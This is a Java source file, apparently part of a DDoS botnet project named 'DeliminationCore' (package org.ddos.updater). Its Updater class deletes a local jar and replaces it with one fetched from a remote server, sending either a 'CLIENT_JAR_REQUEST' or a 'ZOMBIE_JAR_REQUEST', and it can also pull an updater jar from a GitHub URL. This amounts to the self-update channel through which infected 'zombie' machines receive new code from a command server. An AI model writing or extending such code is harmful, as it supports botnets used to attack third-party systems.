package org.ddos.updater;

import java.io.File;
import java.io.IOException;
import java.net.URL;

import org.apache.commons.io.FileUtils;
import org.jnetwork.Connection;
import org.jnetwork.DataPackage;
import org.jnetwork.SocketType;

public class Updater {
	public static final String NAME = "DeliminationCoreUpdater";

	public static void main(String[] args) {
		File target = new File(System.getProperty("user.dir") + File.separator + "DeliminationCore" + args[0] + ".jar");

		try {
			System.out.println("Updating...");

			Thread.sleep(1000);

			if (target.exists())
				target.delete();

			target.createNewFile();

			Connection client = new Connection(SocketType.DEFAULT, "server2.jacobsrandomsite.com", 25565);
			client.getOutputStream()
					.writeObject(args.length > 1 ? new DataPackage(args[1]).setMessage("CLIENT_JAR_REQUEST")
							: new DataPackage().setMessage("ZOMBIE_JAR_REQUEST"));
			client.getInputStream().readFile(target);
			client.close();
			System.out.println("Updated!");
		} catch (ClassCastException e) {
			// a FileData object was not returned, so invalid client request
			System.err.println("Invalid client code!");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void downloadIfNonexistent() throws IOException {
		if (!existsOnThisMachine()) {
			FileUtils.copyURLToFile(
					new URL("https://raw.githubusercontent.com/Delmox/Delimination-Core/master/jars/" + NAME + ".jar"),
					new File(System.getProperty("user.dir") + File.separator + NAME + ".jar"));
		}
	}

	public static boolean existsOnThisMachine() {
		return new File(System.getProperty("user.dir") + File.separator + NAME + ".jar").exists();
	}
}